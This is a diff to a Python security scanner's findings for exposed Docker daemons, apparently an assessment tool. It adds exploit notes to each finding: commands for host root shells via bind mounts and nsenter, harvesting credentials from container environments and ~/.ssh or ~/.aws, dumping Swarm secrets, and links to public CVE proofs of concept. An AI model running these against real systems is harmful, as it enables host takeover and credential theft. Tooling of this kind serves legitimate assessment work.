@@ -447,7 +447,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "Never bind the Docker API to a network socket unauthenticated. Bind to "
                 "the local unix socket only, or enforce mutual-TLS (2376 with "
                 "--tlsverify and client certs) and firewall the port.",
-                ["CWE-306", "CWE-284", "CWE-269"], kind="docker_api"))
+                ["CWE-306", "CWE-284", "CWE-269"], kind="docker_api",
+                exploit_note=(
+                    "docker -H http://<ip>:2375 run --rm -v /:/host -it alpine chroot "
+                    "/host sh — root shell on host. Or curl -s http://<ip>:2375/"
+                    "containers/json to enumerate then POST /containers/create with a "
+                    "bind for a full escape."),
+                depth_tier="t1"))
             running = pr.get("running") or []
             tags = pr.get("image_tags") or []
             if running or tags:
@@ -467,7 +473,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"docker -H ...:{p.portid} inspect <id>   # env vars often hold secrets",
                     "Same as above - lock down the API; treat leaked image/registry "
                     "names and env secrets as compromised.",
-                    ["CWE-200"], kind="docker_secrets"))
+                    ["CWE-200"], kind="docker_secrets",
+                    exploit_note=(
+                        "docker -H http://<ip>:2375 ps -a; docker -H ... inspect <id> "
+                        "| jq '.[].Config.Env' — mine every env for creds and mounted "
+                        "volumes for known secret paths (~/.aws, ~/.kube, ~/.ssh)."),
+                    depth_tier="t1"))
             # Per-container host-mount / privileged escape routes.
             risky = pr.get("risky_binds") or []
             if risky:
@@ -490,7 +501,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Never bind-mount host paths like /, /etc, /root, or "
                     "/var/run/docker.sock into containers unless absolutely required. "
                     "Never run containers with --privileged in production.",
-                    ["CWE-284", "CWE-250", "CWE-269"], kind="docker_host_escape"))
+                    ["CWE-284", "CWE-250", "CWE-269"], kind="docker_host_escape",
+                    exploit_note=(
+                        "docker -H ... exec -it <priv_container_id> nsenter -t 1 -m -u "
+                        "-i -n -p sh — full host root via existing container; or chroot "
+                        "/host if a /:/host bind exists."),
+                    depth_tier="t1"))
             # Namespace / capability / secopt / device escape enablers - a
             # separate finding from the bind + privileged check above.
             nse = pr.get("ns_escapes") or []
@@ -518,7 +534,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "required. Never set seccomp=unconfined / apparmor=unconfined "
                     "or no-new-privileges:false. Restrict --device to specific "
                     "safe paths.",
-                    ["CWE-269", "CWE-250"], kind="docker_ns_escape"))
+                    ["CWE-269", "CWE-250"], kind="docker_ns_escape",
+                    exploit_note=(
+                        "docker -H ... exec <container_id> nsenter -t 1 -m -u -i -n -p "
+                        "/bin/sh — if PidMode=host or SYS_ADMIN present. For "
+                        "seccomp=unconfined: docker exec <c> unshare -Ur sh — check for "
+                        "CAP_SYS_ADMIN behaviors."),
+                    depth_tier="t1"))
             # Env-var credentials pulled from Config.Env on every container.
             es = pr.get("env_secrets") or []
             if es:
@@ -544,7 +566,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Never ship secrets in container env vars on a network-"
                     "reachable daemon. Use Swarm/K8s secrets mounted as files, "
                     "or a secrets manager. Rotate every value listed above.",
-                    ["CWE-522", "CWE-798", "CWE-200"], kind="docker_env_secrets"))
+                    ["CWE-522", "CWE-798", "CWE-200"], kind="docker_env_secrets",
+                    exploit_note=(
+                        "docker -H http://<ip>:2375 inspect $(docker -H ... ps -q) | "
+                        "jq -r '.[].Config.Env[]' | grep -Ei 'PASS|KEY|TOKEN|URL' — "
+                        "try each credential against services on the same host or "
+                        "reachable ranges."),
+                    depth_tier="t3"))
             # Version-gated Docker Engine CVEs from ServerVersion (already
             # fetched during the unauth read).
             for cve in (pr.get("engine_cves") or []):
@@ -563,7 +591,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "# confirm ServerVersion",
                     f"Upgrade docker-engine to {cve['fixed_in']} or later on "
                     "the matching release line.",
-                    ["CWE-863", "CWE-306"], kind="docker_engine_cve"))
+                    ["CWE-863", "CWE-306"], kind="docker_engine_cve",
+                    exploit_note=(
+                        "docker -H <sch>://<ip>:2375 version; if ServerVersion < "
+                        "23.0.14 / 26.1.4 / 27.1.0 and daemon has an authz plugin, PoC "
+                        "at https://github.com/AbsoZed/CVE-2024-41110 sends header-only "
+                        "requests to bypass plugin checks."),
+                    depth_tier="t0"))
                 out[-1]["cves"] = [cve["cve"]]
             # Version-gated runc CVEs from /info.RuncCommit.
             for cve in (pr.get("runc_cves") or []):
@@ -579,7 +613,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "--format '{{.RuncCommit.ID}}'",
                     f"Upgrade runc to {cve['fixed_in']} or later (usually via "
                     "a docker-engine / containerd package update).",
-                    ["CWE-668"], kind="docker_runc_cve"))
+                    ["CWE-668"], kind="docker_runc_cve",
+                    exploit_note=(
+                        "docker -H http://<ip>:2375 info --format "
+                        "'{{.RuncCommit.ID}}'; for CVE-2024-21626 PoC see leaked-fd "
+                        "escape at https://github.com/NitroCao/CVE-2024-21626 — run "
+                        "only in ROE, has host-corruption side-effects."),
+                    depth_tier="t0"))
                 out[-1]["cves"] = [cve["cve"]]
             # Swarm secrets / configs / services enumeration.
             if pr.get("swarm_mode"):
@@ -605,7 +645,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         f"docker -H ...:{p.portid} config ls; docker -H ...:{p.portid} service ls",
                         "Bind the swarm manager API to a private interface; "
                         "enable mutual-TLS on the manager listener.",
-                        ["CWE-200", "CWE-306"], kind="docker_swarm_secrets"))
+                        ["CWE-200", "CWE-306"], kind="docker_swarm_secrets",
+                        exploit_note=(
+                            "docker -H ... secret ls; docker -H ... service create "
+                            "--name pwn --secret db_password alpine sleep 3600; then "
+                            "docker -H ... exec pwn cat /run/secrets/db_password to "
+                            "exfiltrate."),
+                        depth_tier="t1"))
             vols = pr.get("volumes") or []
             if vols:
                 # Info only — volume names alone aren't a bug, but they often
